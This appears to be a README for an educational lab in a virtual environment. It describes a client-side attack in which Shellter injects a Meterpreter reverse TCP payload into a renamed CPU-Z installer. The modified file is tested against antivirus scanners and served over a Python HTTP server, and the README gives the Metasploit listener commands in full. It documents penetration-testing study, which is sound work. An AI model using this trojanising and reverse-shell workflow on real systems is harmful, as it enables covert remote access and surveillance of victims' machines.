#Client Side Attacks Lab

A cybersecurity lab project demonstrating the process of performing a controlled client-side attack simulation using Kali Linux, Shellter, Metasploit Framework, and Meterpreter. The project includes payload injection, antivirus scanning, HTTP hosting, reverse TCP connection setup, and remote screensharing in a virtual lab environment.

#Project Overview

This project demonstrates:

Installing and configuring Shellter in Kali Linux
Enabling 32-bit architecture support for Wine
Downloading and preparing executable files
Payload injection using Shellter
Antivirus detection testing with Jotti
Hosting payloads using Python HTTP Server
Configuring Metasploit multi/handler
Establishing Meterpreter reverse TCP sessions
Using Meterpreter screenshare for remote desktop viewing
Tools & Technologies Used
Kali Linux
Shellter
Wine
Python HTTP Server
Metasploit Framework
Meterpreter
Windows Virtual Machine
Jotti Malware Scanner

#Lab Workflow
1. Install Shellter and Wine

Shellter and required Wine dependencies were installed in Kali Linux. 32-bit architecture support was enabled for compatibility.

2. Download and Prepare Executable

The cpu-z_1.79-en.exe file was downloaded and renamed to cpuz.exe for testing purposes.

3. Payload Injection Using Shellter

Shellter Auto Mode was used to inject a Meterpreter reverse TCP payload into the executable file.

4. Antivirus Scan Testing

The modified executable was scanned using the Jotti malware scanning service to test antivirus detection results.

5. Host File Using HTTP Server

Python HTTP server was started on port 8000 to share the payload file over the local network.
python -m http.server

6. Configure Metasploit Listener

A Metasploit multi/handler listener was configured using:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4321
exploit

7. Execute Payload on Target Machine

The Windows target machine downloaded and executed the payload file from the Kali Linux HTTP server.

8. Meterpreter Session Established

A successful reverse TCP Meterpreter session was established between the target and attacker machines.

9. Screenshare Demonstration

The Meterpreter screenshare command was used to remotely view the target machine desktop in real time.

#Learning Outcomes

Understanding client-side attack workflow
Payload injection concepts
Reverse TCP connection setup
Meterpreter session handling
Basic post-exploitation techniques
File hosting and delivery methods
Antivirus evasion testing concepts
Disclaimer

#This project was created strictly for:

Educational purposes
Ethical hacking practice
Authorized cybersecurity lab environments

#PDF Documentation
Detailed screenshots and explanations are available in the project PDF documentation.
